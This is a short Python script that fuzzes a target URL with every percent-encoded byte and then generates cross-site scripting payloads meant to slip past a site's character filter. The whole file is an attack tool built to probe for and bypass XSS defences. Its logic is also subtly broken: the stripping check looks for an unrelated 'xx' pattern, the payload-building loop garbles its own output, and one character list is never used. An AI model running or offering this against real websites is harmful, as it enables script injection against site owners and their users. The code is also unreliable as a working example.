import requests
import re
import argparse

def fuzz_url(url):
    # Define a regular expression to catch responses where the byte was stripped
    stripped_byte_re = re.compile(r'(?<!x)xx(?!x)')

    # List of special characters to be fuzzed
    special_chars = [">", "<", "'", '"', "(", ")", "{", "}", "[", "]", ":", ";", "/", "?", "&", "=", "+", "-"]

    # List to hold stripped bytes
    stripped_bytes = []

    print("Fuzzing with bytes...")
    for i in range(256):
        hex_value = f"%{i:02X}"
        fuzzed_url = url.replace("[FUZZ]", hex_value)
        response = requests.get(fuzzed_url)

        if response.status_code == 200:
            if stripped_byte_re.search(response.text):
                print(f"The byte {hex_value} was stripped.")
                stripped_bytes.append(hex_value)
            else:
                print(f"The byte {hex_value} was not stripped.")

    print("Generating XSS payloads based on stripped bytes...")
    if stripped_bytes:
        payloads = []
        # Your XSS skeleton, you can customize this as you like
        xss_skeleton = "<script>alert('XSS')</script>"

        for stripped_byte in stripped_bytes:
            payload = xss_skeleton
            for ch in xss_skeleton:
                # Insert the stripped byte after each character in the XSS skeleton
                payload = payload.replace(ch, f"{ch}{stripped_byte}")

            payloads.append(payload)

        print("Generated payloads:")
        for payload in payloads:
            print(payload)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Fuzz a URL to identify stripped bytes and generate XSS payloads.")
    parser.add_argument("url", help="The URL to fuzz. Use [FUZZ] where the byte should be injected.")
    args = parser.parse_args()
    fuzz_url(args.url)
